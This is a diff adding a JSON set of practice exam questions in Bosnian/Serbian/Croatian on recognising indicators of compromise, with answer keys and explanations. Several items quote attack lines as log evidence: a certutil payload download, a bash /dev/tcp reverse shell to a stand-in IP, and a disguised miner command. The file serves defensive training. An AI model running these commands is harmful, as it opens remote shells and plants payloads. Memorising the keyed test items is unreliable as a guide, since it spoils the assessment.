@@ -1,0 +1,266 @@
+[
+  {
+    "obj": "1.2",
+    "q": "NetFlow pokazuje da radna stanica 10.0.4.15 svakih 300 sekundi (±5 s) otvara HTTPS konekciju ka istoj IP adresi i šalje oko 400 bajtova. Korisnik nije za računarom od petka. Šta je NAJVJEROVATNIJE?",
+    "options": [
+      "Automatsko ažuriranje Windowsa",
+      "Beaconing ka C2 serveru",
+      "DNS tunneling",
+      "Horizontalni port sweep"
+    ],
+    "answer": 1,
+    "explain": "Pravilni intervali sa malim, ujednačenim paketima ka istoj destinaciji, bez aktivnosti korisnika, su klasičan obrazac beaconinga. Ažuriranja nisu tako ritmična i prenose više podataka, DNS tunneling bi se vidio u DNS upitima, a sweep cilja mnogo hostova."
+  },
+  {
+    "obj": "1.2",
+    "q": "DNS logovi pokazuju hiljade upita sa jednog hosta ka poddomenima istog domena, npr. aGVsbG8gd29ybGQ.t.cdn-sync.net, svaki dužine preko 50 znakova. Koja aktivnost je MOST likely u toku?",
+    "options": [
+      "Eksfiltracija podataka DNS tunelovanjem",
+      "DGA malver traži aktivan C2 domen",
+      "DNS zone transfer",
+      "Normalno ponašanje CDN-a"
+    ],
+    "answer": 0,
+    "explain": "Dugi, Base64 nalik poddomeni ka jednom domenu znače da se podaci kodiraju u DNS upite, što je DNS tunneling. DGA proizvodi mnogo različitih domena i NXDOMAIN odgovora, a zone transfer je AXFR upit ka DNS serveru."
+  },
+  {
+    "obj": "1.2",
+    "q": "Analitičar u pcap-u vidi da 10.0.5.77 šalje SYN pakete na 1000 različitih portova servera 10.0.1.20 u 4 sekunde, a odgovara samo RST. Šta je to?",
+    "options": [
+      "SYN flood DDoS napad",
+      "Lateral movement preko SMB-a",
+      "Vertikalni port scan (enumeracija)",
+      "Beaconing"
+    ],
+    "answer": 2,
+    "explain": "Jedan izvor koji ispituje mnogo portova jednog odredišta je vertikalni port scan, dio enumeracije. SYN flood šalje ogroman broj SYN paketa ka jednom portu radi iscrpljivanja resursa, a ne pregled 1000 portova."
+  },
+  {
+    "obj": "1.2",
+    "q": "DHCP log bilježi novu adresu dodijeljenu MAC adresi b8:27:eb:4a:91:0c sa hostname-om raspberrypi u mreži računovodstva. Uređaj nije u CMDB-u. Koja je BEST sljedeća radnja?",
+    "options": [
+      "Ignorisati jer DHCP radi normalno",
+      "Ugasiti DHCP server",
+      "Formatirati sve računare u računovodstvu",
+      "Locirati port na switchu, izolovati uređaj i provjeriti da li je odobren"
+    ],
+    "answer": 3,
+    "explain": "Neodobren uređaj u osjetljivom segmentu je rogue device. Treba ga pronaći preko MAC tabele na switchu, izolovati (port shutdown ili karantinski VLAN) i utvrditi porijeklo. Gašenje DHCP-a ili formatiranje računara je nesrazmjerno."
+  },
+  {
+    "obj": "1.2",
+    "q": "EDR bilježi: WINWORD.EXE → cmd.exe → certutil.exe -urlcache -f http://198.51.100.23/p.txt C:\\Users\\Public\\p.exe. Kako se OVO NAJBOLJE opisuje?",
+    "options": [
+      "Legitimno preuzimanje certifikata",
+      "Upotreba LOLBin-a za preuzimanje payload-a nakon zlonamjernog dokumenta",
+      "Windows Update preko BITS-a",
+      "Kerberoasting"
+    ],
+    "answer": 1,
+    "explain": "certutil je potpisan Windows alat (LOLBin) koji napadači koriste za preuzimanje fajlova. Word kao roditelj i čuvanje izvršnog fajla u C:\\Users\\Public ukazuju na zlonamjeran makro. Kerberoasting je napad na servisne naloge preko TGS tiketa."
+  },
+  {
+    "obj": "1.2",
+    "q": "Linux web server ima CPU stalno na 100%. ps prikazuje proces kswapd0 koji se izvršava kao korisnik www-data iz /tmp/.m/. Šta je MOST likely?",
+    "options": [
+      "Kernel swap daemon radi zbog nedostatka memorije",
+      "Normalno ponašanje nginx-a pod opterećenjem",
+      "Cryptominer maskiran imenom kernel threada",
+      "Ransomware šifruje disk"
+    ],
+    "answer": 2,
+    "explain": "Pravi kswapd0 je kernel thread koji pripada root-u i nema putanju u /tmp. Proces pod web korisnikom sa tim imenom i stalnim opterećenjem CPU-a je tipičan maskirani miner, najčešće ubačen preko ranjive web aplikacije."
+  },
+  {
+    "obj": "1.2",
+    "q": "Korisnik se uspješno prijavio u 09:01 iz Sarajeva, a u 09:38 iz São Paula, nakon čega je sa brazilske IP adrese registrovana nova MFA metoda. Koja radnja je BEST?",
+    "options": [
+      "Opozvati sesije, resetovati kredencijale i ukloniti novu MFA metodu",
+      "Sačekati sljedeću prijavu da bi se potvrdio obrazac",
+      "Blokirati sav saobraćaj iz Brazila na firewall-u",
+      "Poslati korisniku e-mail sa pitanjem da li putuje"
+    ],
+    "answer": 0,
+    "explain": "Impossible travel praćen registracijom MFA metode je jak indikator preuzetog naloga i perzistencije napadača. Treba odmah opozvati tokene, resetovati lozinku i ukloniti neovlaštenu MFA metodu. E-mail korisniku može čitati napadač, a geo-blok ne rješava već ukradene tokene."
+  },
+  {
+    "obj": "1.2",
+    "q": "U Entra ID logovima vidiš 2.400 neuspjelih prijava na 2.400 različitih naloga u 30 minuta, sa istom lozinkom i iz malog broja IP adresa. Koji napad je u toku?",
+    "options": [
+      "Brute force",
+      "Credential stuffing",
+      "MFA fatigue",
+      "Password spraying"
+    ],
+    "answer": 3,
+    "explain": "Jedna (ili nekoliko) lozinki probana na mnogo naloga je password spraying, osmišljen da izbjegne zaključavanje naloga. Brute force cilja jedan nalog sa mnogo lozinki, credential stuffing koristi parove korisnik/lozinka iz curenja, a MFA fatigue šalje push zahtjeve."
+  },
+  {
+    "obj": "1.2",
+    "q": "CloudTrail pokazuje da je CI servisni nalog sa IP adrese Tor izlaznog čvora pokrenuo 20 p4d.24xlarge instanci u regionu koji kompanija ne koristi. Šta je MOST likely?",
+    "options": [
+      "Autoscaling zbog povećanog opterećenja",
+      "Kompromitovan access ključ i resource compromise radi rudarenja kriptovaluta",
+      "Planirano testiranje oporavka od katastrofe",
+      "Greška u Terraform state fajlu"
+    ],
+    "answer": 1,
+    "explain": "Skupe GPU instance, neiskorišten region i Tor IP adresa su klasičan obrazac ukradenog ključa koji se koristi za rudarenje. Autoscaling i DR test bi radili u poznatim regionima i sa poznatih adresa."
+  },
+  {
+    "obj": "1.2",
+    "q": "Finansijska služba dobija e-mail od „direktora“ sa zahtjevom da se danas hitno izvrši uplata novom dobavljaču. Zaglavlje pokazuje Reply-To na gmail.com adresu i dmarc=fail. Poruka nema priloga ni linkova. Koja kontrola bi NAJBOLJE spriječila štetu?",
+    "options": [
+      "Sandbox za priloge",
+      "Antivirus na mail serveru",
+      "Verifikacija zahtjeva van kanala, pozivom na poznat broj, prije svake uplate ili promjene računa",
+      "Blokiranje svih poruka sa gmail.com"
+    ],
+    "answer": 2,
+    "explain": "Ovo je BEC: nema malvera koji bi sandbox ili antivirus otkrili. Najefikasnija kontrola je procesna, verifikacija preko drugog, poznatog kanala. Blokiranje cijelog gmail.com domena je nepraktično i napadač lako mijenja provajdera."
+  },
+  {
+    "obj": "1.2",
+    "q": "Korisnik prijavljuje link https://bit.ly/3xYzAbc iz poruke o „isteku lozinke“. Šta analitičar treba uraditi PRVO?",
+    "options": [
+      "Kliknuti na link sa svog radnog računara da vidi stranicu",
+      "Razviti skraćeni link bez posjete (preview ili čitanje Location zaglavlja u izolovanom okruženju) i provjeriti reputaciju krajnjeg domena",
+      "Blokirati bit.ly za cijelu kompaniju",
+      "Proslijediti poruku svim zaposlenima kao upozorenje"
+    ],
+    "answer": 1,
+    "explain": "URL shorteneri sakrivaju destinaciju. Analitičar treba bezbjedno utvrditi krajnji URL i njegovu reputaciju prije bilo kakve odluke. Klik sa radnog računara je rizičan, a blokiranje cijelog servisa i masovno prosljeđivanje su preuranjeni."
+  },
+  {
+    "obj": "1.2",
+    "q": "Proxy log pokazuje posjetu domenu rnicrosoft-online.com nakon koje je korisnik unio kredencijale. Kako se zove ova tehnika?",
+    "options": [
+      "URL shortening",
+      "DNS poisoning",
+      "Pharming",
+      "Typosquatting"
+    ],
+    "answer": 3,
+    "explain": "„rn“ vizuelno liči na „m“, pa domen imitira microsoft-online.com. To je typosquatting (vizuelno sličan domen). DNS poisoning i pharming preusmjeravaju pravi domen na lažnu adresu, a ovdje je registrovan drugi domen."
+  },
+  {
+    "obj": "1.2",
+    "q": "Na web serveru nginx access log sadrži: GET /uploads/img.php?cmd=whoami 200. Folder /uploads je namijenjen samo slikama. Šta je NAJVJEROVATNIJE?",
+    "options": [
+      "Web shell postavljen kroz funkciju za upload",
+      "SQL injection",
+      "Cross-site scripting",
+      "Normalan zahtjev za thumbnail slike"
+    ],
+    "answer": 0,
+    "explain": "PHP fajl u folderu za slike koji prima parametar cmd i vraća 200 je web shell, zlonamjerni skript koji izvršava komande na serveru. Sljedeći korak je pregled procesa koje je pokrenuo web server i odlaznih konekcija."
+  },
+  {
+    "obj": "1.2",
+    "q": "Na serveru se pojavljuju Event ID 5001 (Real-time Protection disabled) i 4732 (nalog helpdesk$ dodat u lokalne Administrators), bez otvorenog change ticketa. Kojoj kategoriji indikatora ovo PRVENSTVENO pripada?",
+    "options": [
+      "Activity on unexpected ports",
+      "Service disruption",
+      "Unauthorized configuration (izmjena sigurnosne konfiguracije bez odobrenja)",
+      "Rogue device"
+    ],
+    "answer": 2,
+    "explain": "Isključena zaštita i novi lokalni admin bez change procesa su izmjene konfiguracije u odnosu na baseline. Napadači to rade da bi oslabili odbranu i obezbijedili perzistenciju. Nema indikatora mrežnih portova, prekida servisa ni novog uređaja."
+  },
+  {
+    "obj": "1.2",
+    "q": "Koja DVA indikatora NAJJAČE ukazuju na eksfiltraciju podataka sa file servera? (Izaberi DVA.)",
+    "options": [
+      "Velike lozinkom zaštićene arhive kreirane u C:\\PerfLogs",
+      "Povećan broj Windows Update preuzimanja",
+      "rclone proces koji noću šalje 30 GB ka cloud storage servisu koji kompanija ne koristi",
+      "Veći broj prijava korisnika u ponedjeljak ujutro"
+    ],
+    "answer": [0, 2],
+    "explain": "Staging (pakovanje podataka u arhive na neobičnoj lokaciji) i veliki odlazni prenos alatom za sinhronizaciju ka nepoznatom cloudu su klasični indikatori eksfiltracije. Update preuzimanja su dolazni saobraćaj, a ponedjeljak jutro je normalan obrazac."
+  },
+  {
+    "obj": "1.2",
+    "q": "SIEM prijavljuje impossible travel za korisnika: prijava iz Beograda pa, 10 minuta kasnije, iz Frankfurta. Obje IP adrese pripadaju ASN-u korporativnog SASE provajdera. Šta je MOST likely?",
+    "options": [
+      "Lažno pozitivan alarm zbog izlaznih tačaka cloud proxy-ja",
+      "Session hijacking",
+      "Password spraying",
+      "Kompromitovan nalog koji treba odmah zaključati"
+    ],
+    "answer": 0,
+    "explain": "SASE i VPN usmjeravaju saobraćaj kroz različite tačke prisustva, pa geolokacija skače. Kada obje adrese pripadaju korporativnom provajderu, alarm je najvjerovatnije lažno pozitivan i pravilo treba tuning-ovati (izuzeti poznate ASN-ove)."
+  },
+  {
+    "obj": "1.2",
+    "q": "Tokom vikenda korisnički fajlovi na share-u masovno dobijaju ekstenziju .lockd, CPU i disk I/O na file serveru su na maksimumu, a u svakom folderu se pojavljuje README_RESTORE.txt. Šta treba uraditi FIRST?",
+    "options": [
+      "Pokrenuti antivirus skeniranje cijelog share-a",
+      "Kontaktirati napadača preko adrese iz README fajla",
+      "Vratiti fajlove iz backupa odmah",
+      "Izolovati zaraženi host ili server od mreže da se zaustavi širenje enkripcije"
+    ],
+    "answer": 3,
+    "explain": "Ransomware je aktivno u toku, pa je prioritet obuzdavanje: izolacija od mreže zaustavlja dalju enkripciju i širenje. Vraćanje iz backupa prije obuzdavanja bi dovelo do ponovne enkripcije, a pregovori nisu prvi korak."
+  },
+  {
+    "obj": "1.2",
+    "q": "Na domain controlleru u 15 minuta stiže 600 događaja 4769 sa jednog korisničkog naloga, za različite servisne SPN-ove, sa tipom enkripcije 0x17 (RC4). Šta je MOST likely?",
+    "options": [
+      "Pass-the-hash",
+      "Kerberoasting",
+      "Golden ticket",
+      "DCSync"
+    ],
+    "answer": 1,
+    "explain": "Masovni zahtjevi za servisne tikete (4769), posebno sa slabom RC4 enkripcijom, su obrazac Kerberoastinga: napadač traži tikete da bi offline probio lozinke servisnih naloga. Golden ticket se ne vidi kroz masovne 4769 zahtjeve, a DCSync koristi replikaciju direktorija."
+  },
+  {
+    "obj": "1.2",
+    "type": "match",
+    "q": "Upari svako opažanje sa kategorijom indikatora iz ciljeva ispita.",
+    "options": [
+      "Nova MAC adresa nepoznatog proizvođača u DHCP logu",
+      "mshta.exe učitava .hta fajl sa URL-a",
+      "Lambda funkcija odjednom šalje hiljade e-poruka",
+      "Dvije prijave iz Sarajeva i Tokija u razmaku od 20 minuta",
+      "„Direktor“ traži hitnu uplatu, Reply-To je lični mail",
+      "Telnet servis odgovara na portu 8080 radne stanice",
+      "Web aplikacija vraća greške 500 i restartuje se svakih nekoliko minuta"
+    ],
+    "targets": [
+      "Business email compromise",
+      "Rogue device",
+      "LOLBins",
+      "Cloud resource compromise",
+      "Impossible travel",
+      "Activity on unexpected ports",
+      "Service disruption"
+    ],
+    "answer": [1, 2, 3, 4, 0, 5, 6],
+    "explain": "Nova nepoznata MAC je rogue device, mshta sa URL-a je LOLBin zloupotreba, Lambda koja šalje spam je kompromitovan cloud resurs, prijave sa dva udaljena mjesta u kratkom razmaku su impossible travel, lažni direktor je BEC, protokol na neočekivanom portu je activity on unexpected ports, a pad i restart aplikacije je service disruption."
+  },
+  {
+    "obj": "1.2",
+    "type": "order",
+    "q": "Poredaj događaje kompromitacije web servera hronološkim redom kako bi se NAJVJEROVATNIJE pojavili u logovima.",
+    "options": [
+      "Konekcije ka 198.51.100.23:3333 svakih 60 sekundi",
+      "GET /uploads/x.php?c=id vraća 200",
+      "POST /upload.php sa PHP fajlom maskiranim kao slika",
+      "curl preuzima binarni fajl u /tmp/.m/",
+      "Proces kswapd0 iz /tmp/.m/ troši 100% CPU"
+    ],
+    "answer": [2, 1, 3, 4, 0],
+    "explain": "Napadač prvo postavi web shell kroz upload, zatim ga pozove da izvrši komandu, preuzme miner u /tmp, pokrene ga (rast CPU-a) i miner se periodično javlja mining poolu. Lanac indikatora iz više izvora daje jači zaključak od pojedinačnog alarma."
+  },
+  {
+    "obj": "1.2",
+    "type": "spot",
+    "q": "Lista procesa na Linux web serveru (nginx + PHP) snimljena nakon alarma o visokom opterećenju CPU-a. Označi redove koji su indikatori kompromitacije.",
+    "snippet": "$ ps -eo user,pid,ppid,%cpu,cmd --forest\nUSER       PID  PPID %CPU CMD\nroot         1     0  0.0 /sbin/init\nroot       612     1  0.0 /usr/sbin/sshd -D\nroot       740     1  0.0 /usr/sbin/cron -f\nwww-data   901   880  0.2 nginx: worker process\nwww-data  2231  2230  0.1 php-fpm: pool www\nwww-data  8812  2231  0.0  \\_ sh -c bash -i >& /dev/tcp/203.0.113.50/4444 0>&1\nwww-data  8815     1 97.4 /tmp/.X11-unix/.kworker -o pool.example-xmr.net:443 --donate-level 0\npostgres  1022  1001  0.0 postgres: checkpointer\nroot      1101     1  0.0 /usr/sbin/rsyslogd -n",
+    "lang": "bash",
+    "answer": [7, 8],
+    "explain": "Red 8: php-fpm (PID 2231) je roditelj shella koji preusmjerava bash na /dev/tcp/203.0.113.50:4444, što je reverse shell. Web proces nikad ne treba da pokreće interaktivni shell; to ukazuje na web shell ili RCE u aplikaciji. Red 9: proces čije ime imitira kernel thread (.kworker) pokrenut je iz skrivenog direktorija u /tmp kao www-data, troši 97% CPU-a i spaja se na mining pool: kriptominer (resource consumption + rogue process). Pravi kernel threadovi se u ps prikazuju u uglastim zagradama i nemaju putanju na disku. Ostali redovi su očekivani servisi. Postupak: izolovati host, sačuvati memoriju i dokaze, ukloniti procese i persistence, pa zakrpiti ranjivost u aplikaciji."
+  }
+]
